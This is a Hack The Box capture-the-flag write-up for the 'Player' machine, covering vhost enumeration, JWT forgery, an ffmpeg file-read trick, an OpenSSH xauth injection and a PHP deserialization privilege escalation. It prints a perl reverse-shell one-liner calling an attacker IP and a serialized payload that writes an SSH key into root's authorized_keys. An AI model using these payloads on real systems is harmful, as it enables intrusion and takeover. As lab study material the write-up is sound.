---
layout: single
title: Player - Hack The Box
excerpt: "Player was a tough one. Getting the initial shell on Player took me quite some time. Every time I got new credentials I thought I would be able to log in but there was always another step after. The trickiest part of the box for me was finding the .php~ extension to read the source code of the page. I had the hint from the chat application but I couldn't connect the dots."
date: 2020-01-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-player/player_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - php
  - jwt
  - vhosts
  - codiad
  - ffmpeg
  - lshell
  - openssh xauth
  - pspy
  - cronjob
  - php deserialization
---

![](/assets/images/htb-writeup-player/player_logo.png)

Player was a tough one. Getting the initial shell on Player took me quite some time. Every time I got new credentials I thought I would be able to log in but there was always another step after. The trickiest part of the box for me was finding the .php~ extension to read the source code of the page. I had the hint from the chat application but I couldn't connect the dots.

## Summary

- Scan for vhosts to find the dev, chat and staging websites.
- Find a hint about exposed source code by looking at the chat website.
- On the main webpage, perform directory bruteforcing and find the launcher page.
- The source code for PHP file used in the javascript AJAX call of the launcher page can be retrieved by appending a tilde to the file extension.
- The source code contains the JWT shared secret and we can now forge our own token to log in to the application.
- The media conversion web page uses ffmpeg in the backend which we can use to perform an LFI and retrieve the content of a service configuration file.
- The file contains the telegen user credentials which we can use to log into a lshell restricted shell.
- We can break out of the restricted shell by using enumerating the SSH configuration file through ffmpeg and seeing that xauth is enabled. The xauth exploit allows us to read files on the system and we find another set of credentials in some of the staging PHP code.
- The credentials for user peter allow us to log into the codiad application and create a PHP script inside of web directory path, give us RCE and a shell.
- By watching processes with pspy, we identify there's a PHP script that runs regurlarly as root.
- The PHP script contains a deserialization vulnerability which we exploit to write SSH keys into the root directory and then log in with SSH.

## Fails

- When I decoded the JWT token found on the launcher page, I saw that the access_code was a SHA1 hash. When I looked up the hash online, I saw it was `welcome` and thought it was used to log into the server. It was useless after all... Womp womp.
- I was able to log into the MySQL server without any credentials by port-forwarding once I had creds for the lshell. Then saw I could update the stats table and thought about inserting PHP code into the page. But as it turns out, the string is inserted as part of the PHP code which is already running and querying the database so I ended with a nice `<?php phpinfo(); ?>` that wasn't interpreted.

## Portscan

Running my portscan I see that a 2nd SSH service is running on port 6686 with a different version.

```
root@ragingunicorn:~/htb/player# nmap -sC -sV -p- 10.10.10.145
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-06 19:03 EDT
Nmap scan report for player.htb (10.10.10.145)
Host is up (0.019s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating the website on port 80

I add `player.htb` to my local hostfile and start enumerating the web site on port 80. The main page doesn't seem to have any files that match the default directory index and indexing is disabled so I get a 403 Forbidden error.

![](/assets/images/htb-writeup-player/mainpage_403.png)

I will have to run gobuster to find something. As always, I will start with one of my go-to list: `big.txt` and add the `php` file extension.

```
root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php -u http://player.htb

/launcher (Status: 301)
/server-status (Status: 403)
```

Next, I look at the `/launcher` directory with the same wordlist:

```
root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php -u http://player.htb/launcher

/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
```

Not much interesting seen with gobuster. I'll check the link next with Firefox and see it's a page about an upcoming product. There's a countdown at the top and a link to register for product launch announcements.

![](/assets/images/htb-writeup-player/launcher.png)

Nothing seems to happen when I put an email address in the form. When I check the HTML source I see that the form goes to `dee8dc8a47256c64630d803a4c40786c.php`. That file just redirects to `/launcher` when we do a GET on it.

![](/assets/images/htb-writeup-player/email_form.png)

I could check the HTML source code for all the links on the page but instead I'll use Burp instead to spider the site. 

![](/assets/images/htb-writeup-player/launcher_links.png)

A couple of files stand out, those two filenames that look like an MD5 checksum and the javascript files for the site. 

![](/assets/images/htb-writeup-player/launcher_check.png)

The `simplebuff.js` file does an AJAX call to `dee8dc8a47256c64630d803a4c40786e.php` every 10 seconds to check if the game has been released. The only response I see is `Not released yet`.

The `/launcher/dee8dc8a47256c64630d803a4c40786c.php` link does a GET and returns a cookie with a JWT token:

`Set-Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU; expires=Tue, 06-Aug-2019`

I'll use [https://jwt.io/](https://jwt.io/) to decode the JWT token contents:

![](/assets/images/htb-writeup-player/jwt_token.png)

The access code `C0B137FE2D792459F26FF763CCE44574A5B5AB03` is the SHA-1 hash for `welcome`.

![](/assets/images/htb-writeup-player/crackstation.png)

The access code doesn't give me access to the actual PlayBuff page. There's probably another code that I need to find or maybe I need to brute force the shared secret and forge my own token. At this point I'm not sure what I would forge in the token even if I had the secret key but I'll start with the low hanging fruit and try [https://github.com/AresS31/jwtcat](https://github.com/AresS31/jwtcat) just to see if the key can be recovered easily:

![](/assets/images/htb-writeup-player/jwtcat.png)

No luck in cracking the JWT token.

## Finding additional vhosts

Some boxes have multiple vhosts hosting different websites such as development pages, admin panels, etc. I'll check out the vhosts by using wfuzz:

```
root@ragingunicorn:~/htb/player# wfuzz --sc 200 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -H "Host: FUZZ.player.htb" 10.10.10.145

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000231:  C=200     86 L	     229 W	   5243 Ch	  "dev"
000251:  C=200    259 L	     714 W	   9513 Ch	  "chat"
000796:  C=200     63 L	     180 W	   1470 Ch	  "staging"
```

I found 3 vhosts:

- `dev.player.htb`
- `chat.player.htb`
- `staging.player.htb`

## chat.player.htb

There's a simulated chat application that shows a conversion between the PM and a developper.

![](/assets/images/htb-writeup-player/chat.png)

There are two hints here:

1. The staging area exposes senstive files
2. The main page can show the source code of the application

I ran gobuster and only found the pictures used for the chat application and some javascript files.

## dev.player.htb

The `dev.player.htb` page show a login page:

![](/assets/images/htb-writeup-player/codiad_login.png)

I tried `admin / admin` and a few other obvious passwords but I couldn't log in. From the HTML source code I can't make up what this application is.

I ran gobuster and picked up a few directories.
```
root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php -u http://dev.player.htb 
/common.php (Status: 200)
/components (Status: 301)
/config.php (Status: 200)
/data (Status: 301)
/favicon.ico (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/languages (Status: 301)
/lib (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/themes (Status: 301)
/workspace (Status: 301)
```

I'm still not sure what it is based on the files found. I'll expand my search to other extensions and see if I can pick up a readme file or something that tells me what this application is:

```
root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php,txt,conf,cfg -u http://dev.player.htb -s 200

/LICENSE.txt (Status: 200)
```

That license file tells me that this webapp is Codiad, a web-based IDE.

![](/assets/images/htb-writeup-player/codiad_license.png)

A quick search on google and exploit-DB shows there a few exploits like RCE and LFI but they require authentication. I'll continue on and check the last of the vhosts.

## staging.player.htb

The staging site seems to be in rough shape.

![](/assets/images/htb-writeup-player/staging_home.png)

The updates section display a static image simulating a metrics dashboard.

![](/assets/images/htb-writeup-player/staging_updates.png)

There's a contact form to send messages to the Core team.

![](/assets/images/htb-writeup-player/staging_contact.png)

This could be an exploit vector for an XSS but the page errors out when I enter any data.

![](/assets/images/htb-writeup-player/staging_501.png)

When I check Burp, I see that the GET request returned some PHP output but the page redirect me to the `501.php` page right after.

![](/assets/images/htb-writeup-player/staging_files.png)

This is probably what the hint was referring to. The page shows two files that could be important: `/var/www/backup/service_config` and `/var/www/staging/fix.php`. I can't read those right now but I'll investigate the other hint: source code disclosure on the main page.

## Leaking the shared secret for the JWT token

I tried many extensions for those two md5sum looking filenames until I found a temporary/swap file for `dee8dc8a47256c64630d803a4c40786c.php~`

![](/assets/images/htb-writeup-player/jwt_token_found.png)

I now have the secret: `_S0_R@nd0m_P@ss_`

It's pretty clear from that partial source code that the site expects `0E76658526655756207688271159624026011393` as a valid access code. To forge a proper JWT token with that access code, I'll just use [https://jwt.io/](https://jwt.io/) again and enter the secret to compute the correct signature. When I initially just used the secret from the leaked source code it didn't work so I followed the PHP code, converted the secret to Base64 with `base64_decode(strtr($key, '-_', '+/'))`:

![](/assets/images/htb-writeup-player/jwt_token_forged.png)

When I do a `GET /launcher/dee8dc8a47256c64630d803a4c40786c.php` with that access cookie I now get the secret Location URI:

![](/assets/images/htb-writeup-player/jwt_token_location.png)

Now I can access the application before it's launch date at `http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/`

![](/assets/images/htb-writeup-player/playbuff.png)

##  Exploiting ffmpeg

The web application is basically just a glorified media converter. You upload a media file and it gets converted to an `AVI` video container format.

![](/assets/images/htb-writeup-player/playbuff_convert.png)

I tried uploading PHP files and other non-media file types and I always got a 404 when I tried to follow the download link after:

![](/assets/images/htb-writeup-player/playbuff_404.png)

I couldn't figure out any way to upload PHP code or figure out if my uploads were being saved to some temporary file that I could find the filename for. I did some research and found a vulnerability in ffmpeg which allows for an LFI inside video files.

I used the following payload: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS)

First I'll try to read `/etc/passwd` with `python3 gen_avi_bypass.py /etc/passwd ~/htb/player/payload.avi`

I then upload the video and view the resulting converted video:

![](/assets/images/htb-writeup-player/passwd.png)

Nice, the exploit works. Next, I'll have a look at those files I previously found in the staging site.

`python3 gen_avi_bypass.py /var/www/backup/service_config ~/htb/player/payload.avi`

![](/assets/images/htb-writeup-player/service_config.png)

Cool, I found some credentials: `telegen / d-bC|jC!2uepS/w`. I'll check the `fix.php` file next:

`python3 gen_avi_bypass.py /var/www/staging/fix.php ~/htb/player/payload.avi`

I can't read that one. The resulting video file was empty so I probably don't have access to it.

## Restricted shell

With the user `telegen` I'm able to SSH to the 2nd service running on port 6686 but I'm in restricted shell and can't run any commands:

```
root@ragingunicorn:~/htb/player# ssh -p6686 telegen@10.10.10.145
telegen@10.10.10.145's password: 
Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
Environment:
  USER=telegen
  LOGNAME=telegen
  HOME=/home/telegen
  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
  MAIL=/var/mail/telegen
  SHELL=/usr/bin/lshell
  SSH_CLIENT=10.10.14.11 55802 6686
  SSH_CONNECTION=10.10.14.11 55802 10.10.10.145 6686
  SSH_TTY=/dev/pts/0
  TERM=xterm-256color
========= PlayBuff ==========
Welcome to Staging Environment

telegen:~$ ls
*** forbidden command: ls
telegen:~$ help
  clear  exit  help  history  lpath  lsudo
telegen:~$ lpath
Allowed:
 /home/telegen 
telegen:~$ lsudo
Allowed sudo commands:
```

The `SHELL` environment variable points `lshell`. I don't know that one so I'll google it and discover that it's web based python shell.

From the [website](https://github.com/ghantoos/lshell) description:

> lshell is a shell coded in Python, that lets you restrict a user's environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user's commands, implement timing restriction, and more. 

The configuration file is located here `/etc/lshell.conf`. Maybe there are some allowed commands that I need to find so I'll exfil the config file using the same ffmpeg trick.

![](/assets/images/htb-writeup-player/lshell_conf.png)

I don't see any allowed commands, nothing obvious stands out in the configuration. I can probably still port forward connections even if my shell is limited. I'll do a dynamic port forwarding with `ssh -D 127.0.0.1:1080 -p 6686 telegen@10.10.10.145` so I can use a SOCKS proxy and port scan the box through proxychains.

I run a fast scan with nmap and find MySQL listening on localhost:

```
# proxychains nmap -sT 127.0.0.1 -F
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-08 23:16 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.018s latency).
Not shown: 97 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

## Fail at MySQL

Funny enough, I can connect to the MySQL server without any authentication:

```
root@ragingunicorn:~/htb/player# proxychains mysql -h 127.0.0.1 -u root
ProxyChains-3.1 (http://proxychains.sf.net)
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 298
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| integrity          |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.02 sec)
```

The `integrity` database contains a mapping of the token to filenames.

```
Database changed
MySQL [integrity]> show tables;
+---------------------+
| Tables_in_integrity |
+---------------------+
| media               |
| stats               |
+---------------------+
2 rows in set (0.02 sec)

MySQL [integrity]> select * from stats;
+------+----------------+
| id   | status         |
+------+----------------+
|    1 | no issues yet
 |
+------+----------------+
1 row in set (0.02 sec)

MySQL [integrity]> select * from media;
+-----+----------------+------------+
| sno | video          | token      |
+-----+----------------+------------+
|  18 | 78683241.avi   | 673109167  |
|  19 | 1619102457.avi | 2112073545 |
|  20 | 490922722.avi  | 72247503   |
|  21 | 1530970781.avi | 1923945228 |
|  22 | 2129471110.avi | 672162071  |
+-----+----------------+------------+
5 rows in set (0.02 sec)
```

The `no issues yet` message is displayed at the bottom of the staging site `update.php` page. I can change it and try to inject PHP code on the page:

```
MySQL [integrity]> delete from stats where id=1;
Query OK, 1 row affected (0.02 sec)

MySQL [integrity]> insert into stats (id, status) values (1, "<?php phpinfo();?>");
Query OK, 1 row affected (0.03 sec)
```

When I check the update page I don't see anything on the product status and my PHP code hasn't been executed. Looking at the HTML source code, I see that the PHP tag has been inserted into the code but no PHP code is executed.

![](/assets/images/htb-writeup-player/staging_phptry.png)

I can't read arbitrary files with `LOAD_FILE` or write with `INTO OUTFILE`. `secure_file_priv` is configured so I can only read/write within the directory below:

```
MySQL [integrity]> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
1 row in set (0.02 sec)
```

```
MySQL [integrity]> select load_file("/etc/passwd");
+--------------------------+
| load_file("/etc/passwd") |
+--------------------------+
| NULL                     |
+--------------------------+
1 row in set (0.02 sec)

MySQL [integrity]> select * from stats into outfile "/tmp/test";
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
MySQL [integrity]> select * from stats into outfile "/var/lib/mysql-files/test";
Query OK, 2 rows affected (0.02 sec)

MySQL [integrity]> select load_file("/var/lib/mysql-files/test");
+------------------------------------------+
| load_file("/var/lib/mysql-files/test")   |
+------------------------------------------+
| \N	<?php phpinfo();?>
1	no issues yet\

 |
+------------------------------------------+
1 row in set (0.02 sec)
```

This seems like a dead end so I will move on.

## OpenSSH xauth vulnerability

There are a few CVE's for version 7.2 of OpenSSH running on port 6686, one that could be interesting is the CVE-2016-3115: OpenSSH 7.2p1 - (Authenticated) xauth Command Injection. This should allow me to inject xauth commands by sending forged x11 channel requests. But `X11Forwarding yes` needs to be enabled for it to work. I'll fetch the sshd config file with the ffmpeg exploit and hope it's the one used by the sshd daemon running on port 6686.

![](/assets/images/htb-writeup-player/sshd_config.png)

X11Forwarding is enabled and it's not a default configuration so this is probably a hint that I'm on the right track.

To run the exploit I just pass the IP/port and the credentials, then once it's connected I can write and read files. To verify that's it's working correctly, I read `/etc/hostname` and see that it returns `player` as expected.

```
root@ragingunicorn:~/htb/player# python xauth.py 10.10.10.145 6686 telegen 'd-bC|jC!2uepS/w'
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@10.10.10.145:6686
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#> .readfile /etc/hostname
DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/hostname\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:player
#>
```

I'll grab the flag next since I know the user directory is `/home/telegen`:

```
#> .readfile /home/telegen/user.txt
DEBUG:__main__:auth_cookie: 'xxxx\nsource /home/telegen/user.txt\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:30e47ab....
```

On the staging site there was that `fix.php` file that was erroring out but I couldn't read it from the ffmpeg exploit. I have access to read this file now with `telegen` and I can a potential set of credentials: `peter / CQXpm\z)G5D#%S$y=`

```
#> .readfile /var/www/staging/fix.php
DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:<?php
class
protected
...
//modified
//for
//fix
//peter
//CQXpm\z)G5D#%S$y=
}
public
if($result
static::passed($test_name);
...
```

## Remote code execution through Codiad

I didn't see a `peter` user in `/etc/passwd` so the next logical place to try the credentials is on the `dev.player.htb` site. I can successfully log in with `peter / CQXpm\z)G5D#%S$y=`. I get a blank IDE page and I find a single project.

![](/assets/images/htb-writeup-player/codiad.png)

![](/assets/images/htb-writeup-player/codiad_projects.png)

The path of the project doesn't exist and errors out when I try to open it.

![](/assets/images/htb-writeup-player/codiad_error.png)

If I try to create a new project with an absolute path of `/tmp` I get the following error:

![](/assets/images/htb-writeup-player/codiad_abspath.png)

I just found the path for one of website: `/var/www/demo`. If I can create PHP files in there I might be able to get RCE. I'll create a new project using `/var/www/demo/snowscan` as path:

![](/assets/images/htb-writeup-player/codiad_abspath2.png)

To test PHP execution I just call `phpinfo()` and see that it works:

![](/assets/images/htb-writeup-player/codiad_phpinfo.png)

![](/assets/images/htb-writeup-player/phpinfo.png)

Next, I'll get a shell using perl with the following PHP code:

```php
<?php system('perl -e \'use Socket;$i="10.10.14.11";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''); ?>
```

Finally, I get a shell as `www-data`.

![](/assets/images/htb-writeup-player/shell.png)

## Privesc

Now it's time to get root. I see some weird script running but I can't read `dothis.sh` so I don't know what it does.

```
root       990  0.0  0.0   4456   680 ?        Ss   01:23   0:00 /bin/sh -c /etc/init.d/dothis.sh
root       991  0.0  0.4  13896  4392 ?        S    01:23   0:03 /bin/bash /etc/init.d/dothis.sh

www-data@player:/$ more /etc/init.d/dothis.sh
/etc/init.d/dothis.sh: Permission denied
```

I ran LinEnum next but didn't find anything interesting. Next up: checking for cronjobs starting processes. I'll use [pspy](https://github.com/DominicBreuker/pspy) to watch running processes and new ones created. I quickly identify a process running as root: `/usr/bin/php /var/lib/playbuff/buff.php`

![](/assets/images/htb-writeup-player/pspy.png)

The content of the file is shown here:

```php
<?php
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
class playBuff
{
	public $logFile="/var/log/playbuff/logs.txt";
	public $logData="Updated";

	public function __wakeup()
	{
		file_put_contents(__DIR__."/".$this->logFile,$this->logData);
	}
}
$buff = new playBuff();
$serialbuff = serialize($buff);
$data = file_get_contents("/var/lib/playbuff/merge.log");
if(unserialize($data))
{
	$update = file_get_contents("/var/lib/playbuff/logs.txt");
	$query = mysqli_query($conn, "update stats set status='$update' where id=1");
	if($query)
	{
		echo 'Update Success with serialized logs!';
	}
}
else
{
	file_put_contents("/var/lib/playbuff/merge.log","no issues yet");
	$update = file_get_contents("/var/lib/playbuff/logs.txt");
	$query = mysqli_query($conn, "update stats set status='$update' where id=1");
	if($query)
	{
		echo 'Update Success!';
	}
}
?>
```

There is a subtle deserialization vulnerability here. The contents of `merge.log` are deserialized then the MySQL stats table is updated. The `telegen` is the owner of the file so it should be possible to get control of the `logFile` and `logData` variables in the `PlayBuff` class and write arbitrary data to any file I want to as root.

```
www-data@player:/var/lib/playbuff$ ls -l
total 16
-rwx---r-- 1 root    root    878 Mar 24 17:19 buff.php
-rw-r--r-- 1 root    root     15 Jul  9 07:34 error.log
-r-------- 1 root    root     14 Mar 24 16:54 logs.txt
-rw------- 1 telegen telegen  13 Jul  9 07:34 merge.log
```

First I'll `su` to user `telegen` and specify that I want a Bash shell and not that lshell restricted shell:

```
www-data@player:/var/lib/playbuff$ su -s /bin/bash telegen
Password: 
telegen@player:/var/lib/playbuff$ id
uid=1000(telegen) gid=1000(telegen) groups=1000(telegen),46(plugdev)
```

For the serialized payload, I will write my SSH public to root's `authorized_keys` then I should be able to log in as root:
 - Object class: playBuff (it contains 2 properties)
 - logFile: `../../../../../../root/.ssh/authorized_keys`
 - logData: content of my SSH public key

```
O:8:"playBuff":2:{s:7:"logFile";s:43:"../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:399:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+SZ75RsfVTQxRRbezIJn+bQgNifXvjMWfhT1hJzl/GbTbykFtGPTwuiA5NAcPKPG25jkQln3J8Id2ngapRuW8i8OvM+QBuihsM9wLxu+my0JhS/aNHTvzJF0uN1XkvZj/BkbjUpsF9k6aMDaFoaxaKBa7ST2ZFpxlbu2ndmoB+HuvmeTaCmoY/PsxgDBWwd3GiRNts2HOiu74DEVt0hHbJ7kwhkR+l0+6VS74s+7SjP+N1q+oih83bjwM8ph+9odqAbh6TGDTbPX2I+3lTzCUeGS9goKZe05h/YtB2U2VbH1pxJZ1rfR1Sp+SBS+zblO9MUxvbzQoJTHpH2jeDg89 root@ragingunicorn";}
```

I wait a bit for the cronjob to run then I'm able to SSH in as root after my public key has been written into root's SSH directory:

![](/assets/images/htb-writeup-player/root.png)
